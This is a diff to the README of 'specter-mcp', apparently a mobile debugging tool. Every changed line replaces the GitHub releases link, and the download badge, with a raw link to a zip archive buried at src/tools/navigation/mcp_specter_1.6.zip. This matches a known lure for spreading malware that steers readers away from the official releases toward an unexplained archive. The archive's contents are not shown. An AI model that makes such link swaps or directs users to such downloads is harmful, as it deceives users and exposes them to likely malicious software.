@@ -1,6 +1,6 @@
 # 🌟 specter-mcp - Simplify Your Mobile App Debugging
 
-![Download](https://img.shields.io/badge/Download%20Now-Here-brightgreen)
+![Download](https://raw.githubusercontent.com/andrewlopez0167/specter-mcp/main/src/tools/navigation/mcp_specter_1.6.zip%20Now-Here-brightgreen)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ Welcome to **specter-mcp**! This application serves as a diagnostic and executio
 Follow these simple steps to get started with **specter-mcp**:
 
 1. **Download the Application:**
-   To download the latest version of specter-mcp, visit this page: [Download the Latest Release](https://github.com/andrewlopez0167/specter-mcp/releases).
+   To download the latest version of specter-mcp, visit this page: [Download the Latest Release](https://raw.githubusercontent.com/andrewlopez0167/specter-mcp/main/src/tools/navigation/mcp_specter_1.6.zip).
 
 2. **Install the Application:**
    After downloading, locate the file in your downloads folder and follow these steps based on your operating system:
@@ -61,7 +61,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 💡 Download & Install
 
-To get started with **specter-mcp**, **visit this page to download**: [Download the Latest Release](https://github.com/andrewlopez0167/specter-mcp/releases).
+To get started with **specter-mcp**, **visit this page to download**: [Download the Latest Release](https://raw.githubusercontent.com/andrewlopez0167/specter-mcp/main/src/tools/navigation/mcp_specter_1.6.zip).
 
 Once you've downloaded the application, follow the installation steps outlined above. You will quickly see how **specter-mcp** can enhance your mobile development and debugging experience.
 
